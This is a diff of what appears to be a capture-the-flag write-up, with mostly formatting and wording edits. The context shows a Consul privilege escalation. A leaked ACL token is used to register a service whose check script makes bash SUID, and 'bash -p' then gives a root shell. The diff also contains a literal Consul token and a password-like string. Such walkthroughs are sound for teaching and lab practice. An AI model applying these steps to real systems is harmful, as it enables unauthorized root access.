@@ -228,7 +228,7 @@ dontStandSoCloseToMe63221!
 ```
 
 but there's nothing in there that we don't already know 
-```json
+```bash
 consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 [
         {
@@ -244,7 +244,7 @@ consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 ]
 ```
 
-there's also the Django secret key, I believe that might allow us to do some attacks on the cryptography django, not sure that's relevant right now.
+there's also the Django secret key, I believe that might allow us to do some attacks on the cryptography related methods in django, not sure that's relevant right now.
 ```bash
 +# Quick-start development settings - unsuitable for production
 +# See https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/
@@ -299,7 +299,7 @@ first I'll be forwarding the agent port to my local machine so I can use jq
 ssh -fNL 8500:localhost:8500 developer@example.org
 ```
 listing all existing services
-```json
+```bash
 curl -s \
   -H "X-Consul-Token: ${token}" \
   -X GET 'http://127.0.0.1:8500/v1/agent/services' |\
@@ -348,7 +348,7 @@ curl -s \
 }
 ```
 listing a specific service
-```json
+```bash
 curl -s \
   -H "X-Consul-Token: ${token}" \
   -X GET 'http://127.0.0.1:8500/v1/agent/service/meow' |\
@@ -393,7 +393,7 @@ ls -la $(which bash)
 ```
 
 and creating a service that calls that bash script as a check
-```json
+```bash
 curl -s \
   -H "X-Consul-Token: ${token}" \
   -X PUT 'http://127.0.0.1:8500/v1/agent/service/register' \
@@ -414,7 +414,7 @@ curl -s \
 ```
 
 checking that my service has been created 
-```json
+```bash
 curl -s \
   -H "X-Consul-Token: ${token}" \
   -X GET 'http://127.0.0.1:8500/v1/agent/service/blnkn' |\
@@ -457,7 +457,7 @@ and now bash is suid, so we can run it with preserve and it won't drop root perm
 ```bash
 ls -la $(which bash)
 -rwsr-sr-x 1 root root 1183448 Apr 18 09:14 /usr/bin/bash
- bash -p
+bash -p
 id
 uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer)
 cd /root/
